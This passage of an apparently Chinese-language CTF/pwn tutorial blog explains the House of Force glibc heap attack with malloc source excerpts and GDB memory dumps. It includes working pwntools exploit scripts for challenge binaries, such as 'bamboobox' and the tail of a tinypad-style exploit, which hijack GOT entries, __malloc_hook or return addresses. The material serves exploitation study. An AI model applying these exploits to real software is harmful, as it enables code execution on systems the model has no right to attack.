class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x58</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())<span class="comment">#too much,可以接收太多遗留信息了,以后函数尽量使用sendlineafter编写</span></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="comment">#p.recvall()</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">666</span>)+p64(environ)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x602148</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;INDEX: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">240</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_ret))</span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">quit()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House Of Force 是一种堆利用方法,主要通过修改top_chunk的size足够大使得申请出一个偏移大小的chunk后,top_chunk更新到指向目标地址,当再次申请chunk时得到一个包含目标地址的chunk</p><p><strong>利用条件:</strong></p><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理,进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><p>glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是前面说的需要一个能够控制 top chunk size 域的漏洞。</p><p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成<strong>无符号数</strong>，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</p><p>之后会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p>与此同时，我们需要注意的是，topchunk 的 size 也会更新</p><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p><strong>篡改 <code>malloc@got.plt</code> 实现劫持程序流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;        // &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br><span class="line">    malloc(-4120);  // &lt;=== 减小top chunk指针</span><br><span class="line">    malloc(0x10);   // &lt;=== 分配块实现任意地址写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们分配一个 0x10 字节大小的块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0xffffffffffffffff &lt;=== top chunk size域被更改</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt</span><br></pre></td></tr></table></figure><p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p><p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p><p><code>0x601010-0x602020=-4112</code></p><p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>之后分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p><p>但是需要注意的是，在被抬高的同时，<strong>malloc@got 附近的内容也会被修改。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>在上一个示例中，演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;                 &lt;=== 修改top chunk size</span><br><span class="line">    malloc(140737345551056); &lt;=== 增大top chunk指针</span><br><span class="line">    malloc(0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p><p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056</code> 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure><h2 id="2-31新限制"><a href="#2-31新限制" class="headerlink" title="2.31新限制"></a>2.31新限制</h2><p>主要是对申请大小也有限制</p><p><strong>2.31以前:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><ol><li>需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于等于 -2 * MINSIZE(32位0x10,64位0x20)，这个一般情况下都是可以满足的。</li><li>需要使得 <code>request2size</code>正好转换为目标地址对应偏移的大小,注意负数与无符号数的对应</li></ol><p>这里需要注意的一个点是,虽然代码中request2size在REQUEST_OUT_OF_RANGE的后面,但是实际上运行中比较<code>((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</code>时,其实已经执行了request2size,也就是req已经是最终需要申请的大小</p><p><strong>2.31及以后:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRDIFF_MAX INT64_MAX</span></span><br><span class="line">Expands to:</span><br><span class="line"><span class="number">0x7FFFFFFFFFFFFFFF</span><span class="comment">//有符号下最大的正整数</span></span><br></pre></td></tr></table></figure><p>对申请大小的检测多了一道,需要不大于有符号下最大的正整数</p><p>也就是说不能申请一个负数了,该攻击手法不能向低地址申请任意chunk了</p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p><strong>bamboobox</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bbb&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序有一个magic后门</p><p>程序虽然没有pie,但是堆基址依然会随机化,虽然可以泄露,并以此修改got表虽然可以做,但会更麻烦一点</p><p>程序在开始申请了一个chunk专门用于存放两个函数指针,分别是进入程序和退出程序时的提示信息</p><p>而且程序在edit时,输入大小是自己任意指定的</p><p>所以利用house of force</p><p>分配chunk到第一个chunk中并修改函数指针,并退出</p><p>即可触发magic</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf_path=<span class="string">&#x27;./bbb&#x27;</span></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,tbs(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">sa(<span class="string">b&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="built_in">str</span>(idx).encode()+<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;index of item:&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&#x27;of item:&#x27;</span>,tbs(idx))</span><br><span class="line">sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">sa(<span class="string">b&#x27;the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">magic=<span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;d&quot;</span>) </span><br><span class="line">payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line">offset=-<span class="number">0x30</span>-<span class="number">0x20</span>-<span class="number">0x8</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(offset, <span class="string">b&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>bcloud</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bcloud&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序是一个笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。</p><p>程序主要有以下几个功能</p><ol><li>新建 note，根据用户的输入 x 申请 x+4 的空间作为 note 的大小。</li><li>展示 note，啥功能也没有。。</li><li>编辑 note，根据用户指定的 note 编辑对应的内容。</li><li>删除 note，删除对应 note。</li><li>同步 note，标记所有的 note 已经被同步。</li></ol><p>然而在这五个功能中都没有明显可利用的漏洞,实际上漏洞在开始时。</p><p>在读取名字时是先读入到栈中然后再利用strcpy函数转移至堆中,都知道strcpy是遇到空字符才会停止,而栈中<strong>存储堆的指针紧邻着name缓冲区</strong>,这就意味着只要填满name缓冲区,就会将堆指针一起写到堆中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 